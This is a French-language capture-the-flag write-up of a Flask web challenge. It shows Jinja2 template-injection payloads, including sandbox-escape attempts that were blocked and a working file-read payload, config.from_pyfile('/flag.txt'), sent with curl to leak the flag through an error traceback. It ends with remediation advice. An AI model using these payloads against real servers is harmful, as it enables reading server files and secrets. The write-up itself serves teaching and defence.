# Neurona Maintenance (2025) — Web

**Flag :** `OPENNC{S4ndb0x_3sc4p3_vi4_c0nfig_l04d!}`

## Énoncé

Interface de maintenance web des ingénieurs XANTHOS, accès public. Elle est
« protégée par une sorte de bac à sable logiciel qui bloque les commandes
classiques ». Le flag est dans `/flag.txt` à la racine. Indice : *« ils adorent
utiliser des fichiers de configuration pour tout et n'importe quoi »*.
Instance Docker (ctfd-whale), auteur : Yoan.

## Reconnaissance

La page d'accueil (Flask) indique un endpoint `/diagnose?config=...` qui « teste
un moteur de rendu ». C'est une **SSTI Jinja2** :

```
/diagnose?config={{7*7}}   ->  49
/diagnose?config={{config}} ->  <Config {'DEBUG': False, ... }>
```

L'objet `config` est bien celui de Flask.

## Le sandbox

Le moteur est un `jinja2.sandbox.SandboxedEnvironment`. Tous les accès aux
attributs dunder sont neutralisés :

```
{{ ().__class__.__bases__ }}   -> access to attribute '__class__' of 'tuple' object is unsafe.
{{ lipsum.__globals__["os"] }} -> access to attribute '__globals__' of 'function' object is unsafe.
{{ dict.mro() }}               -> access to attribute 'mro' of 'type' object is unsafe.
```

Un simple `{{ x.__class__ }}` renvoie un *undefined* silencieux (vide), et toute
chaîne de dunders qu'on tente d'enchaîner dessus lève l'erreur ci-dessus. Les
évasions classiques (`__subclasses__`, `__globals__`, `str.format`) sont donc
mortes.

Globals disponibles : `dict`, `lipsum`, `cycler`, `namespace`, `joiner`,
`range`, et surtout **`config`** — un véritable objet `flask.Config`.

## Faille — abus des méthodes « sûres » de flask.Config

Le sandbox n'interdit que les attributs commençant par `_`. Les **méthodes
publiques** de `flask.Config` restent appelables, dont celles qui **lisent des
fichiers** : `from_pyfile`, `from_file`, `from_object`…

`Config.from_pyfile(path)` lit le fichier et l'`exec()` comme du Python. Comme
`/flag.txt` contient `OPENNC{...}` — pas du Python valide — l'interpréteur lève
une **`SyntaxError`**, et le traceback de Flask **recopie la ligne fautive**,
c'est-à-dire le contenu du flag :

```
/diagnose?config={{ config.from_pyfile("/flag.txt") }}

ERREUR DE DIAGNOSTIC : SyntaxError dans le fichier '/flag.txt'

>>> OPENNC{S4ndb0x_3sc4p3_vi4_c0nfig_l04d!}
```

## Exploitation

```bash
B=http://legacychalls.hackagou.nc:PORT
curl -s -G "$B/diagnose" --data-urlencode 'config={{ config.from_pyfile("/flag.txt") }}'
# -> ... SyntaxError ... >>> OPENNC{S4ndb0x_3sc4p3_vi4_c0nfig_l04d!}
```

## Remédiation

- Ne jamais rendre une entrée utilisateur comme template, même « sandboxé ».
- Exposer un `flask.Config` (ou tout objet à méthodes de lecture de fichiers)
  dans le contexte d'un `SandboxedEnvironment` annule le sandbox : filtrer aussi
  les méthodes publiques dangereuses (`is_safe_attribute`).
- Ne pas renvoyer les tracebacks au client.
